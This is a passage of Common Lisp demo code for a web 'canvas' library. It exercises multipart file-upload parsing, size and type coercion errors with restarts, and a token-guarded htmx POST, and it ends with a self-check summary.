                 (stack-mime:parse-mime (browser-body +upload-boundary+ +upload-files+ :header-block t))))
         (field (list :field "images" :max-size +max-image-bytes+ :accept +image-accept+)))
    (format t "~&three parts, parsed by mime-protocol from a browser-shaped body (the input's ~a, max-size ~d):~%"
            +image-accept+ +max-image-bytes+)
    (dolist (p parts)
      (format t "  name ~s filename ~s ~a, ~d bytes~%"
              (stack-mime:disposition-name (stack-mime:mime-content-disposition p))
              (stack-mime:disposition-filename (stack-mime:mime-content-disposition p))
              (stack-mime:media-type-essentials (stack-mime:mime-content-type p)) (length (stack-mime:mime-content p))))
    (destructuring-bind (ok big gif) parts
      (let ((f (apply #'canvas:coerce-param ok :file field)))
        (format t "~&../../chart.png → ~s~%  filename ~s (the last path segment), media type ~s, size ~d, octets ~s, path ~s~%" (type-of f)
                (canvas:uploaded-file-filename f) (canvas:uploaded-file-media-type f) (canvas:uploaded-file-size f)
                (type-of (canvas:uploaded-file-octets f)) (canvas:uploaded-file-path f))
        (check :upload-ok (and (canvas:uploaded-file-p f) (= (length +png+) (canvas:uploaded-file-size f)))))
      (format t "photos/holiday.png →~%")
      (let ((v (handler-bind ((canvas:canvas-coercion-error
                                (lambda (c) (report-coercion c) (check :too-large (typep c 'canvas:canvas-upload-too-large))
                                  (invoke-restart 'canvas:use-default))))
                 (apply #'canvas:coerce-param big :file :default :no-image field))))
        (format t "  use-default → ~s~%" v))
      (format t "spinner.gif →~%")
      (let ((v (handler-bind ((canvas:canvas-coercion-error
                                (lambda (c) (report-coercion c) (check :wrong-type (eq :accept (canvas:coercion-error-expected c)))
                                  (format t "    the error fragment next to the input: ~a~%" (canvas:to-html (canvas:error-fragment c)))
                                  (invoke-restart 'use-value :skipped))))
                 (apply #'canvas:coerce-param gif :file field))))
        (format t "  use-value :skipped → ~s~%" v))
      (format t "~&the form's handler, UPLOAD-IMAGES (:multiple t, the first failure wins; coerce-form takes use-default):~%")
      (format t "  all three parts →~%  ~a~%" (app-resolved (lambda () (canvas:to-html (upload-images :images parts)))))
      (format t "  chart.png only  →~%  ~a~%" (app-resolved (lambda () (canvas:to-html (upload-images :images (list ok))))))))
  (let* ((body (browser-body +upload-boundary+ +upload-files+))
         (r (rh:htmx-request-env (rh:make-htmx-client (guarded-app token) :codec (rh:htmx-transport-codec *transport*))
                                 (browser-post-env (format nil "/canvas/~a" (rh:htmx-method-name 'upload-images)) body
                                                   (format nil "multipart/form-data; boundary=~a" +upload-boundary+)
                                                   (format nil "canvas-token=~a" token)))))
    (format t "~&the same three files POSTed through the app as a browser sends them (~d bytes) → ~d~%  ~a~%"
            (length body) (rh:htmx-reply-status r) (text (rh:htmx-reply-body r)))
    (format t "  rpc-backend-htmx 0.1.0's codec reads every multipart part as UTF-8 text, so a binary file never reaches~%  the handler; the parts above come straight from mime-protocol. End to end is rpc-backend-htmx#5.~%")))

(defun run-demos (&key (port 18467) (dir (uiop:getcwd)))
  (setf http-backend-async:*event-backend-maker* #'event-backend-libuv:make-libuv-backend
        canvas:*canvas-theme* :engels)
  (let* ((token (format nil "~(~{~2,'0x~}~)" (coerce (stack-crypto:generate-key :nbytes 16) 'list)))
         (hp:*http-backend* (http-backend-async:make-async-backend))
         (hp:*http-client* (hp:make-http-client hp:*http-backend*)))
    (format t "canvas-protocol ~a, theme ~s, chart backend ~s, htmx ~a + sse ~a~%token: ~d hex chars (printed as <token>)~%"
            (asdf:component-version (asdf:find-system "canvas-protocol")) canvas:*canvas-theme*
            (type-of canvas:*chart-backend*) canvas:+htmx-version+ canvas:+htmx-sse-version+ (length token))
    (demo-in-process token)
    (srv:with-server (s (guarded-app token) :port port)
      (format t "~&serving on http://127.0.0.1:~d/canvas/ (Hunchentoot)~%" port)
      (demo-http port token)
      (demo-freeze dir)                 ; before the redefinition: the bar chart
      (demo-redefine port))
    (format t "~&~%server stopped~%")
    (setf *checks* '())
    (let ((*print-pretty* nil))        ; one line per printed list
      (demo-keys token)
      (demo-svg dir)
      (demo-upload token))
    (let ((checks '()))                 ; one entry per name, in first-seen order, AND of its values
      (loop for (k . v) in (reverse *checks*)
            for cell = (assoc k checks)
            do (if cell (setf (cdr cell) (and (cdr cell) v)) (push (cons k v) checks)))
      (setf checks (nreverse checks))
      (format t "~&~%self-check (0.2.0): ~{~(~a~) ~s~^, ~}~%all ~d true: ~s~%"
              (loop for (k . v) in checks collect k collect v) (length checks) (every #'cdr checks)))
    t))
